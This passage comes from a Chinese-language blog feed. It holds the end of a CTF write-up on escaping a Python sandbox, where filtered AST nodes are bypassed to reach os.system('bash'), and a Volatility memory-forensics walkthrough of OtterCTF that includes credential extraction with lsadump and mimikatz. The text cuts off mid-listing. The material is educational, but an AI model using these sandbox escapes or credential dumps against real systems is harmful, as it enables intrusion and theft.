class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;])*&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。&lt;/p&gt;
&lt;p&gt;当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串&lt;/p&gt;
&lt;p&gt;在这个 payload 中，需要构造出 _wrap_close、system、bash&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_wrap_close&amp;quot;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;quot;bash&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;那么就可以通过下面的方式获取到这几个字符串：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(system=[]))[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]            &lt;span class=&#34;comment&#34;&gt;# system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(_wrap_close=[]))[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]       &lt;span class=&#34;comment&#34;&gt;# _wrap_close&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(bash=[]))[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]              &lt;span class=&#34;comment&#34;&gt;# bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;绕过-astsubscript-获取列表字典元素&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-astsubscript-获取列表字典元素&#34;&gt;#&lt;/a&gt; 绕过 ast.Subscript 获取列表 / 字典元素&lt;/h4&gt;
&lt;p&gt;题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(system=[])))            &lt;span class=&#34;comment&#34;&gt;# system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(_wrap_close=[])))       &lt;span class=&#34;comment&#34;&gt;# _wrap_close&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(bash=[])))              &lt;span class=&#34;comment&#34;&gt;# bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;globals&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt;(get=get_func):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        get_func(&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;绕过-astfor-遍历列表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-astfor-遍历列表&#34;&gt;#&lt;/a&gt; 绕过 ast.For 遍历列表&lt;/h4&gt;
&lt;p&gt;在构造最终 payload 中，我们还需要在  &lt;code&gt;__subclasses__()&lt;/code&gt;  得到的列表中获取到 _wrap_close 类。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_wrap_close&amp;quot;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;quot;bash&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;filter_func&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;subclazzes_item&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [ _wrap_close:=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(_wrap_close=[])))]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; subclazzes_item:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt;(_＿name_＿=name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; name==_wrap_close:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; subclazzes_item&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    subclazzes_item:=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(filter_func,subclazzes()))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;fitler 中使用 match/case 和 if 来进行过滤。&lt;/p&gt;
&lt;p&gt;除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。&lt;/p&gt;
&lt;h2 id=&#34;end&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#end&#34;&gt;#&lt;/a&gt; END&lt;/h2&gt;
&lt;p&gt;贴一个自动化的 Python 沙箱逃逸 payload bypass 框架，不知道将来用不用得到&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Macr0phag3/parselmouth&#34;&gt;GitHub - Macr0phag3/parselmouth &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/27/Volatility/</guid>
            <title>Volatility</title>
            <link>http://example.com/2024/04/27/Volatility/</link>
            <pubDate>Sat, 27 Apr 2024 21:21:27 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;volatility&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#volatility&#34;&gt;#&lt;/a&gt; Volatility&lt;/h1&gt;
&lt;h2 id=&#34;先以otterctf为例&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#先以otterctf为例&#34;&gt;#&lt;/a&gt; 先以 OtterCTF 为例&lt;/h2&gt;
&lt;h3 id=&#34;查看镜像信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看镜像信息&#34;&gt;#&lt;/a&gt; 查看镜像信息&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem imageinfo&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/27/KXFZGlghQHNO1pV.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;会存在很多镜像，一般第一个就是对的，可以用下面的命令验证&lt;/p&gt;
&lt;h3 id=&#34;调出shell窗口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调出shell窗口&#34;&gt;#&lt;/a&gt; 调出 shell 窗口&lt;/h3&gt;
&lt;p&gt;可以测试你猜测的系统是否正确，正确的话就能 getshell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 volshell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/27/ifqPBN6nQaem9xy.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;获取镜像的用户名密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取镜像的用户名密码&#34;&gt;#&lt;/a&gt; 获取镜像的用户名密码&lt;/h3&gt;
&lt;p&gt;可以使用 hashdump，但得到密码都是哈希加密之后的，使用 lsadump 或者 mimikatz 可以得到明文&lt;/p&gt;
&lt;p&gt;直接利用后两个插件，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 lsadump&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/27/agyq4mCIkoNDTxf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py --plugins=/home/kali/Tools/volatility/volatility/plugins -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 mimikatz&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/27/KOo1QvPUIL5SlEN.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;获取ip地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取ip地址&#34;&gt;#&lt;/a&gt; 获取 ip 地址&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 netscan&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/27/xWKpT6HfXEYjmM3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;获取主机名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取主机名&#34;&gt;#&lt;/a&gt; 获取主机名&lt;/h3&gt;
&lt;h4 id=&#34;查注册表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查注册表&#34;&gt;#&lt;/a&gt; 查注册表&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 hivelist&lt;/code&gt; 1&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/27/Ru2EskHAVjNKnLS.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;主机名信息在 SYSTEM 的那一条记录中，再用 &lt;code&gt;-o + Virtual printkey&lt;/code&gt;  来查看指定的记录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/zX3WmVt7.png&#34; alt=&#34;1714225836369.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;跟进 ControlSet001&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &amp;quot;ControlSet001&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/AmM6lBI3.png&#34; alt=&#34;1714225968337.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续跟进 Control&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &amp;quot;ControlSet001\Control&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/nrln55Q5.png&#34; alt=&#34;1714226095273.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;跟进 ComputerName&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &amp;quot;ControlSet001\Control\ComputerName&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/hytyDofb.png&#34; alt=&#34;1714226188973.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续跟进 ComputerName&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &amp;quot;ControlSet001\Control\ComputerName\ComputerName&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/VY8kbFyI.png&#34; alt=&#34;1714226289670.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;到处注册表： &lt;code&gt;hivedump&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看进程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看进程&#34;&gt;#&lt;/a&gt; 查看进程&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 pslist&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/9MVecqc2.png&#34; alt=&#34;1714227976982.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;题目要求找到他玩的游戏，排除认识的程序，找不认识的百度一下，这个 lunarMS 就是答案，还需要找出游戏的服务器 ip，用 grep 正则表达&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/27/VytbGj3H.png&#34; alt=&#34;1714231953244.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取进程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取进程&#34;&gt;#&lt;/a&gt; 提取进程&lt;/h3&gt;
&lt;p&gt;1.memdump 将进程以 dmp 文件保存&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D /home/kali&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/y5fOqc3A.png&#34; alt=&#34;1714273354650.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在利用 strings 提取字符串找到游戏账号&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/lxorhNOd.png&#34; alt=&#34;1714273819021.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 提取完整进程&lt;/p&gt;
&lt;p&gt;用 procdump 提取&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D /home/kali&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/wiWQTqG0.png&#34; alt=&#34;1714276933594.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看剪切板&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看剪切板&#34;&gt;#&lt;/a&gt; 查看剪切板&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 clipboard&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/OG2gk9ul.png&#34; alt=&#34;1714274863169.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得邮箱&lt;/p&gt;
&lt;h3 id=&#34;查看进程树&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看进程树&#34;&gt;#&lt;/a&gt; 查看进程树&lt;/h3&gt;
&lt;p&gt;题目要求找到恶意程序&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 pstree&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/cWd85PrG.png&#34; alt=&#34;1714275093047.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以用 dlllist 查看一下进程相关的 dll 文件列表&lt;/p&gt;
&lt;h3 id=&#34;查看dll文件列表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看dll文件列表&#34;&gt;#&lt;/a&gt; 查看 dll 文件列表&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/GVnk8dUj.png&#34; alt=&#34;1714275458700.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;运行在 temp 中，不太正经，就是题目答案&lt;/p&gt;
&lt;h3 id=&#34;扫描文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描文件&#34;&gt;#&lt;/a&gt; 扫描文件&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 filescan |grep &amp;quot;Rick And Morty&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/28/6P7Ze8HX.png&#34; alt=&#34;1714276122628.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;volpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#volpy&#34;&gt;#&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;http://vol.py&#34;&gt;vol.py &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt; -h&lt;/h2&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Shell&#34;&gt;&lt;figure class=&#34;iseeu highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span 